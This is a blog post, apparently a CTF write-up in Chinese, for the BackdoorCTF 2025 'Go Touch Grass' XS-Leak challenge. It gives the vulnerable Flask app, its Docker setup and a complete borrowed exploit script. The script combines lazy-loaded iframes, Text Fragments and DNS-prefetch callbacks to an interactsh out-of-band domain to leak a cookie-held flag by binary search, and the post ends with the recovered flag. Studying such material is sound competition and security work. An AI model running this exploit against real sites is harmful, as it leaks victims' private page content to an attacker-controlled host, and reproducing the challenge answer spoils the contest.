+++
title= "BackdoorCTF 2025"
slug= "backdoorCTF-2025"
description= ""
date= "2025-12-10T22:49:38+08:00"
lastmod= "2025-12-10T22:49:38+08:00"
image= ""
license= ""
categories= ["赛题"]
tags= [""]

+++

## Go Touch Grass

一道 XS-Leak 的题目，就是利用懒加载来处理

```python
from flask import Flask, request, make_response, render_template_string
import os, base64, sys, threading, time, jsonify, nh3
from selenium import webdriver
from selenium.webdriver.chrome.options import Options
from flask_limiter import Limiter
from flask_limiter.util import get_remote_address


app = Flask(__name__)

PORT = 6005

flag = open('flag.txt').read().strip()
# flag charset is string.ascii_lowercase + string.digits

ALLOWED_TAGS = {
    'a', 'b', 'blockquote', 'br', 'code', 'div', 'em', 
    'h1', 'h2', 'h3', 'i', 'iframe', 'img', 'li', 'link', 
    'ol', 'p', 'pre', 'span', 'strong', 'ul'
}
ALLOWED_ATTRIBUTES = {
    'a': {'href', 'target'},
    'link': {'rel', 'href', 'type', 'as'}, 
    '*': {

        'style','src', 'width', 'height', 'alt', 'title',
        'lang', 'dir', 'loading', 'role', 'aria-label'
    }
}

APP_LIMIT_TIME = 60  
APP_LIMIT_COUNT = 5  


limiter = Limiter(
    get_remote_address,
    app=app,
    storage_uri="memory://" 
)

@app.errorhandler(429)
def ratelimit_handler(e):
    return jsonify({
        "error": f"Too many requests, please try again later. Limit is {APP_LIMIT_COUNT} requests per {APP_LIMIT_TIME} seconds."
    }), 429

template = """<!DOCTYPE html>
<html>
<head>

</head>
<body>
    <div class="head"></div>
    {% if flag %}
        <div class="flag"><h1>{{ flag }}</h1></div>
    {% endif %}
    {% if note %}
        <div class="note">{{ note | safe}}</div>
    {% endif %}
    <script nonce="{{ nonce }}">
        Array.from(document.getElementsByClassName('flag')).forEach(function(element) {
            let text = element.innerText;
            element.innerHTML = '';
            for (let i = 0; i < text.length; i++) {
                let charElem = document.createElement('span');
                charElem.innerText = text[i];
                element.appendChild(charElem);
            }
        });
    </script>
</body>
</html>
"""



@app.route('/', methods=['GET'])
def index():

    _flag = request.cookies.get('flag', None)
    nonce = base64.b64encode(os.urandom(32)).decode('utf-8')
    _note = request.args.get('note', 'Try putting your note with /?note=..')
    clean_note = nh3.clean(
        _note, 
        tags=ALLOWED_TAGS, 
        attributes=ALLOWED_ATTRIBUTES,
    )
    
    rendered = render_template_string(
        template,
        nonce=nonce,
        flag=_flag,
        note=clean_note,
    )
    
    response = make_response(rendered)

    response.headers['Content-Security-Policy'] = (
        f"default-src 'none'; script-src 'nonce-{nonce}'; style-src 'none'; "
        "base-uri 'none'; frame-ancestors 'self'; frame-src 'self'; object-src 'none'; "
    )
    response.headers['Referrer-Policy'] = 'no-referrer'
    response.headers['X-Frame-Options'] = 'SAMEORIGIN'
    response.headers['X-Content-Type-Options'] = 'nosniff'
    
    return response

def admin_visit(raw_data_b64: str):
    try:
    
        try:
            data = base64.b64decode(raw_data_b64.encode('utf-8')).decode('utf-8')
        except Exception as e:
            print(f"[BOT] base64 decode error: {e}", file=sys.stderr)
            return

        url = f"http://127.0.0.1:6005/?note={data}"
        print(f"[BOT] Visiting {url}", file=sys.stderr)

        options = Options()
        options.add_argument("--headless")
        options.add_argument("--no-sandbox")
        options.add_argument("--disable-dev-shm-usage")
        options.add_argument("--disable-gpu")

        driver = webdriver.Chrome(options=options)

        try:
            
            driver.get("http://127.0.0.1:6005/")
            driver.add_cookie({
                'name': 'flag',
                'value': flag.replace("{", "").replace("}", ""), 
                'path': '/',
                'httpOnly': True,
                'sameSite': 'Strict'
            })

            print(f"[BOT] Now visiting target URL {url}", file=sys.stderr)

           
            driver.set_page_load_timeout(5)
            try:
                driver.get(url)
            except Exception as e:
                print(f"[BOT] error during driver.get: {e}", file=sys.stderr)
            time.sleep(5)
        finally:
            driver.quit()
            print(f"[BOT] Done visiting URL {url}", file=sys.stderr)

    except Exception as e:
        print(f"[BOT] Unexpected bot error: {e}", file=sys.stderr)


@app.route('/bot', methods=['GET'])
@limiter.limit(f"{APP_LIMIT_COUNT} per {APP_LIMIT_TIME} second")
def bot():
    raw_data = request.args.get('note')
    if not raw_data:
        return make_response("Missing ?note parameter\n", 400)

    t = threading.Thread(target=admin_visit, args=(raw_data,))
    t.daemon = True
    t.start()

    return make_response("Admin will visit this URL soon.\n", 202)


if __name__ == '__main__':
    app.run(port=PORT, debug=False, host='0.0.0.0')
```

为了方便启动容器，将 dockerfile 加上代理

```dockerfile
FROM python:3.10-slim

ARG HTTP_PROXY=""
ARG HTTPS_PROXY=""
ARG NO_PROXY="localhost,127.0.0.1,.docker.internal"

ENV http_proxy=$HTTP_PROXY
ENV https_proxy=$HTTPS_PROXY
ENV no_proxy=$NO_PROXY

ENV PYTHONDONTWRITEBYTECODE=1
ENV PYTHONUNBUFFERED=1

RUN apt-get update && apt-get install -y \
    chromium \
    chromium-driver \
    fonts-liberation \
    libnss3 \
    libxss1 \
    libappindicator3-1 \
    libasound2 \
    libatk-bridge2.0-0 \
    libgtk-3-0 \
    libx11-xcb1 \
    libxcomposite1 \
    libxrandr2 \
    libgbm1 \
    libxdamage1 \
    libpango-1.0-0 \
    libpangocairo-1.0-0 \
    --no-install-recommends && \
    apt-get clean && \
    rm -rf /var/lib/apt/lists/*

ENV CHROME_BIN=/usr/bin/chromium
ENV CHROMEDRIVER_BIN=/usr/bin/chromedriver

WORKDIR /app

RUN pip install --no-cache-dir flask selenium nh3 jsonify Flask-Limiter

COPY ./flag.txt /app/flag.txt
COPY ./main.py /app/main.py

EXPOSE 6005

ENTRYPOINT [ "python", "/app/main.py" ]

# docker build -t webx:latest `
#   --build-arg HTTP_PROXY=http://host.docker.internal:7890 `
#   --build-arg HTTPS_PROXY=http://host.docker.internal:7890 .


# docker run -d `
#   --name webx `
#   -p 6005:6005 `
#   --shm-size=2gb `
#   webx:latest
```

为了方便写了一个`docker-compose.yml`

```yaml
services:
  webx:
    container_name: webx
    build:
      context: .
      args:
        HTTP_PROXY: http://host.docker.internal:7890
        HTTPS_PROXY: http://host.docker.internal:7890
    ports:
      - "6005:6005"
    
    shm_size: '2gb'

    extra_hosts:
      - "host.docker.internal:host-gateway"

    volumes:
      - ./main.py:/app/main.py
      - ./flag.txt:/app/flag.txt

    restart: unless-stopped
```

最后没成功解出来，看了大佬的 exp，发现有这样的好东西，OAST 监控 启动了一个子进程运行 `interactsh-client`，https://github.com/projectdiscovery/interactsh 这是一个类似于 DNSLog 的工具。

```python
import httpx
import urllib.parse
import base64
import time
import string
import subprocess
import re
import os
import sys
import threading
import random

TARGET_URL = "http://34.10.220.48:6005"
INTERACTSH_BIN = "./interactsh-client"
INTERACTSH_LOG = "interactsh.log"

def monitor_output(proc):
    try:
        if proc.stdout is None:
            return
        with open("interactsh_stdout.log", "w") as f:
            for line in iter(proc.stdout.readline, ''):
                if line:
                    f.write(line)
                    f.flush()
    except Exception as e:
        print(f"[!] Error in monitor_output: {e}")

def health_check(client, attacker_domain):
    print("[*] Running Health Check...")
    impossible = "flag_IMPOSSIBLE_" + str(random.randint(1000,9999))
    unique_id = "healthcheck"
    
    payload = generate_payload([impossible], unique_id, attacker_domain)
    send_to_bot(client, payload)
    
    print("    Waiting 12.5s for DNS callback...")
    time.sleep(12.5)
    
    if check_logs(unique_id):
        print("[+] Health Check PASSED (DNS received).")
        return True
    else:
        print("[-] Health Check FAILED (No DNS received).")
        print("    The exploit might be blocked, the bot is down, or the iframe isn't loading.")
        return False

def generate_payload(guesses, unique_id, attacker_domain):
    spacer = '<img src="x" height="4000" width="10">'
    
    dns_link = f'<link rel="dns-prefetch" href="//{unique_id}.{attacker_domain}">'
    inner_note = urllib.parse.quote(dns_link)
    iframe_src = f"/?note={inner_note}"
    
    marker = "bottom_marker"
    
    payload = f"""
    {spacer}
    <div>{marker}</div>
    <iframe loading="lazy" src="{iframe_src}" width="100" height="100"></iframe>
    """
    
    encoded_payload = urllib.parse.quote(payload)
    
    fragment_params = "&".join([f"text={g}" for g in guesses])
    fragment = f":~:{fragment_params}&text={marker}"
    
    data = f"{encoded_payload}#{fragment}"
    return base64.b64encode(data.encode('utf-8')).decode('utf-8')

def send_to_bot(client, b64_data):
    try:
        r = client.get(f"{TARGET_URL}/bot", params={'note': b64_data})
        return r.status_code
    except Exception as e:
        print(f"[!] Error sending to bot: {e}")
        return 0

def start_interactsh():
    if os.path.exists(INTERACTSH_LOG):
        os.remove(INTERACTSH_LOG)
        
    print("[*] Starting interactsh-client...")
    process = subprocess.Popen(
        [INTERACTSH_BIN, "-json", "-o", INTERACTSH_LOG],
        stdout=subprocess.PIPE,
        stderr=subprocess.STDOUT,
        text=True
    )
    
    domain = None
    start_time = time.time()
    if process.stdout is None:
        print("[!] Error: process.stdout is None")
        return process, None

    while time.time() - start_time < 30:
        line = process.stdout.readline()
        if not line:
            if process.poll() is not None:
                break
            continue
            
        print(f"[DEBUG] {line.strip()}")
        
        if ".oast." in line or ".interactsh." in line:
            words = line.split()
            for word in words:
                if ".oast." in word or ".interactsh." in word:
                    clean_word = re.sub(r'\x1b\[[0-9;]*m', '', word)
                    if "." in clean_word:
                        domain = clean_word
                        break
        if domain:
            break
            
    if not domain:
        print("[!] Failed to get interactsh domain. Check if interactsh-client is working.")
        process.terminate()
        sys.exit(1)
        
    print(f"[+] Interactsh Domain: {domain}")
    
    t = threading.Thread(target=monitor_output, args=(process,))
    t.daemon = True
    t.start()
    
    return process, domain

def check_logs(unique_id):
    if not os.path.exists(INTERACTSH_LOG):
        return False
        
    try:
        with open(INTERACTSH_LOG, 'r') as f:
            for line in f:
                if unique_id in line:
                    return True
    except Exception as e:
        print(f"[!] Error reading logs: {e}")
    return False

FREQ_ORDER = "{}_0123456789abcdefghijklmnopqrstuvwxyz-@."

def reorder_candidates(candidates):
    sorted_candidates = sorted(candidates, key=lambda c: FREQ_ORDER.index(c) if c in FREQ_ORDER else 999)
    
    final_list = []
    
    left = 0
    right = len(sorted_candidates) - 1
    
    while left <= right:
        if left == right:
            final_list.append(sorted_candidates[left])
            break
            
        final_list.append(sorted_candidates[left])
        final_list.append(sorted_candidates[right])
        
        left += 1
        right -= 1
        
    return final_list

def binary_search_char(client, known_prefix, candidates, attacker_domain):
    if len(candidates) == 1:
        char = candidates[0]
        unique_id = f"try-{random.randint(10000,99999)}"
        print(f"    [?] Verifying: {char} ... ", end='', flush=True)
        
        payload = generate_payload([known_prefix + char], unique_id, attacker_domain)
        status = send_to_bot(client, payload)
        if status != 202:
            print(f"Error {status}")
            return None
            
        time.sleep(12.5)
        
        if not check_logs(unique_id):
            print("FOUND! (No DNS)")
            return char
        else:
            print("No")
            return None

    mid = len(candidates) // 2
    left_group = candidates[:mid]
    right_group = candidates[mid:]
    
    unique_id_left = f"batch-{random.randint(10000,99999)}"
    print(f"    [?] Batch {len(left_group)} chars ({left_group[0]}..{left_group[-1]}) ... ", end='', flush=True)
    
    guesses = [known_prefix + c for c in left_group]
    payload = generate_payload(guesses, unique_id_left, attacker_domain)
    status = send_to_bot(client, payload)
    
    if status != 202:
        print(f"Error {status}")
        return None
        
    time.sleep(12.5)
    
    if not check_logs(unique_id_left):
        print("CORRECT (No DNS) -> Recursing Left")
        if len(left_group) == 1:
             print("    -> Found!")
             return left_group[0]
        return binary_search_char(client, known_prefix, left_group, attacker_domain)
    else:
        print("WRONG (DNS) -> Recursing Right")
        return binary_search_char(client, known_prefix, right_group, attacker_domain)

class Logger(object):
    def __init__(self):
        self.terminal = sys.stdout
        self.log = open("exploit_output.log", "w")

    def write(self, message):
        self.terminal.write(message)
        self.log.write(message)
        self.log.flush()

    def flush(self):
        self.terminal.flush()
        self.log.flush()

def main():
    sys.stdout = Logger()
    start_time_total = time.time()
    
    proc, attacker_domain = start_interactsh()
    
    known_prefix = "flag" 

    try:
        charset = string.ascii_lowercase + string.digits + "_-@{}."
        
        print(f"[+] Target: {TARGET_URL}")
        print(f"[+] Starting search for: {known_prefix}...")

        with httpx.Client(http2=True) as client:
            while True:
                if not health_check(client, attacker_domain):
                    print("[!] Health check failed. Aborting.")
                    break

                print(f"[+] Starting Binary Search for next char...")
                char_start_time = time.time()
                
                candidates = reorder_candidates(list(charset))
                
                found_char = binary_search_char(client, known_prefix, candidates, attacker_domain)
                
                if found_char:
                    known_prefix += found_char
                    if known_prefix.startswith("flag"):
                        display_flag = known_prefix[:4] + "{" + known_prefix[4:] + "}"
                    else:
                        display_flag = known_prefix
                    
                    elapsed_char = time.time() - char_start_time
                    print(f"[+] Current Flag: {display_flag} (Found in {elapsed_char:.2f}s)")
                else:
                    print("[-] Binary search failed to find a matching character.")
                    print("    -> This likely means we reached the end of the flag (or the char is not in our charset).")
                    break
                
    except KeyboardInterrupt:
        print("\n[!] Stopping...")
    finally:
        if known_prefix.startswith("flag"):
            final_flag = known_prefix[:4] + "{" + known_prefix[4:] + "}"
        else:
            final_flag = known_prefix
        print(f"\n[+] FINAL FLAG: {final_flag}")

        total_elapsed = time.time() - start_time_total
        print(f"[*] Total Execution Time: {total_elapsed:.2f}s")
        print("[*] Killing interactsh-client...")
        proc.terminate()

if __name__ == "__main__":
    main()
```



```python
[+] FINAL FLAG: flag{5n34kydn5f3tch}
[*] Total Execution Time: 1376.76s
[*] Killing interactsh-client...

Sneaky DNS Fetch
```

如果使用 requests 是很容易不成功的，所以她真是一坨💩
